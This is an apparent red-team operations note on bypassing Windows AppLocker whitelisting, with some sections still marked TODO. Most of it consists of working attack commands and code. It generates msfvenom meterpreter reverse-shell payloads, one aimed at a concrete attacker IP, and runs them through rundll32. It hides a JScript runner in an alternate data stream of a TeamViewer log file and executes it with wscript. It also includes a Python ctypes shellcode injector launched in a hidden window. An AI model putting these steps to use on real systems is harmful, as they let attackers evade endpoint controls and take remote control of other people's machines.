---
title: Bypassing application whitelisting
tags:
  - breach
  - operations
  - bypass
  - application
  - whitelist
  - allowlist
  - applocker
  - python
  - jscript
  - ctypes
  - sysinternals
  - icacls
  - accesscheck
  - rundll32
---

## AppLocker

TODO

## Finding trusted folders

TODO SysInternals TODO arguments

- `-w` to locate writeable directores
- `-u` to suppress any errors
- `-s` to recursively search through all subdirectories

```powershell
accesscheck.exe "${USERNAME}" "${DIRECTORY}" -wus
```

TODO using `icacls.exe`

```powershell
icacls.exe "${DIRECTORY}"
```

Example execution

```powershell
PS> icacls.exe C:\Windows\Tasks
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
                 BUILTIN\Administrators:(F)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
```

Above shows that `NT AUTHORITY\Authenticated Users` has `ReadExecute` and
`WriteDirectory` permissions. If AppLocker allows code execution from the
`C:\Windows` directory, an unprivileged, authenticated user would be able to
gain code execution.

## Bypass with rundll32

Unmanaged code within DLLs can be used to bypass default AppLocker rules, as
code execution is restricted to executables, not DLLs. With this, we can invoke
the following command to execute DLLs and bypass AppLocker restrictions:

```powershell
rundll32 "${DLL_PATH}","${EXPORTED_METHOD}"
```

The above example invocation will load and execute the provided DLL, invoking
the specified exported method.

AppLocker can also publish rules to restrict DLL execution to particular
directories, however, we can also use the directory-based bypass discussed in
the previous section,
[[bypassing-application-whitelisting#Finding trusted folders|Finding trusted folders]],
to execute DLLs.

### Executing an msfvenom DLL payload

The following invocation will generate a **meterpreter** DLL payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f dll -o payload.dll
```

We can execute the payload on a Windows host to obtain a reverse shell by
invoking the following:

```powershell
rundll32 .\payload.dll,entrypoint
```

## Bypass with alternate data streams

The Windows NTFS filesystem has a feature that allows data to be stored in
**Alternate Data Streams (ADS)**. If we're able to write our text-based
payloads, for example Jscript, to an file's ADS contained with a trusted
directory, we can bypass directory-based restrictions.

The following invocation will generate a raw **meterpreter** shellcode payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.190 LPORT=8443 -f raw -o shell.txt
```

We use the [SharpShooter](https://github.com/X0RW3LL/SharpShooter/tree/master)
utility to wrap our **meterpreter** shellcode payload in a **Jscript** runner
for .NET Framework version 4:

```bash
python ~/opt/SharpShooter/SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output shell
```

We use techniques described in our previous section,
[[bypassing-application-whitelisting#Finding trusted folders|Finding trusted folders]],
to find a candidate text file that we can write an **ADS** to. Here's an example
invocation of writing our `shell.js` payload to an **ADS**:

```cmd
type shell.js > "${FILE_PATH}:shell.js"
```

In our example, we'll use this **TeamViewer** log file:

```cmd
type shell.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:shell.js"
```

To execute the payload, we'll use `wscript` to execute the contents of the
**Jscript** payload in the file's **ADS**:

```cmd
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:shell.js"
```

## Other bypass methods

AppLocker only enforces rules against native file types. Code execution with
third-party scripting engines like Python or Perl are not restricted. Similarly,
we could also gain code execution with Java. There is also a lack of enforcement
against VBA code inside Microsoft Office documents, highlighting the usefulness
of Office documents in client-side attacks.

Here's an example invocation of `msfvenom` to create a Python **meterpreter**
reverse shell payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f python -o payload.py
```

The following Python script uses `ctypes` to inject our shellcode into the
current Python process and executes it:

```python
import ctypes
from sys import exit


class Constants:
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_SIZE = 0x3000


def main() -> int:
    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
    # ...
    buf += b"\xff\xd5"

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    segment = kernel32.VirtualAlloc(
        None,
        len(buf),
        Constants.PAGE_SIZE,
        Constants.PAGE_EXECUTE_READWRITE,
    )

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
    )

    kernel32.RtlMoveMemory(segment, ctypes.create_string_buffer(buf), len(buf))
    ctypes.cast(segment, ctypes.CFUNCTYPE(None))()

    return 0


if __name__ == "__main__":
    exit(main())
```

Invoke the Python **meterpreter** reverse shell payload on a Windows host with
the following:

```powershell
Start-Process `
    -FilePath (Get-Command python).Source `
    -ArgumentList @((Resolve-Path -Path ".\ReverseShell.py").Path) `
    -WindowStyle Hidden
```
